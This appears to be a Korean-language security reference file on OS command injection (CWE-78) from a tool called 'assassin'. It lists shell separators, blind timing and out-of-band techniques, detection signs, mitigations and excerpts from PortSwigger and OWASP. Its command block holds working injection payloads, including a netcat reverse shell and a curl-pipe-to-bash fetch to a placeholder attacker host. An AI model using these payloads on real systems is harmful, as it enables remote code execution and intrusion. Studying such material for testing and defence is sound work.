# 학습 시드(심화): command-injection

> 종합 레퍼런스(확립된 보안 지식 · 권위 출처 검증가능). 라이브 최신화: `assassin --learn command-injection`. P1: 머신별 라이트업 미참조.

## 개요
OS 명령 주입: 입력이 셸 명령에 삽입되어 임의 명령 실행. CWE-78.

## 핵심 기법 · 열거
- 구분자: ; | & && || `cmd` $(cmd) 개행
- 블라인드: 시간지연(; sleep 5) / OOB(; nslookup <lhost>)
- 인자 주입·와일드카드 악용
- 활용: 역방향 셸 즉시 투입

## 표준 도구 · 명령
```
127.0.0.1; id
127.0.0.1 | nc <lhost> 4444 -e /bin/sh
$(curl http://<lhost>/s.sh|bash)
; ping -c1 <lhost>    # 블라인드 OOB 확인
```

## 블루팀 탐지
웹프로세스의 비정상 자식(sh/bash/nc/curl). 아웃바운드 DNS/ICMP 이상. 입력에 셸 메타문자.

## 완화
셸 미경유 API(execve 인자배열)·입력 허용목록·메타문자 거부·최소권한.

- 출처(검증): https://portswigger.net/web-security/os-command-injection

## 최신 보강(승격)

> `assassin --promote` 품질 관문을 통과한 권위 출처 발췌. 수정·삭제는 PR 리뷰로. 사람이 다듬은 위 섹션이 우선한다.

### PortSwigger OS Command Injection
- 출처: https://portswigger.net/web-security/os-command-injection
- 승격일: 2026-10-07
- 요약: OS command injection In this section, we explain what OS command injection is, and describe how vulnerabilities can be detected and exploited. We also show you some useful commands and techniques for different operating systems, and describe how to prevent OS command injection. Labs If you're familiar with the basic concepts behind OS command injection vulnerabilities and want to practice exploiting them on some realistic, deliberately vulnerable targets, you can access labs in this topic from t

### OWASP Command Injection
- 출처: https://owasp.org/www-community/attacks/Command_Injection
- 승격일: 2026-10-07
- 요약: Command Injection Description Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible large
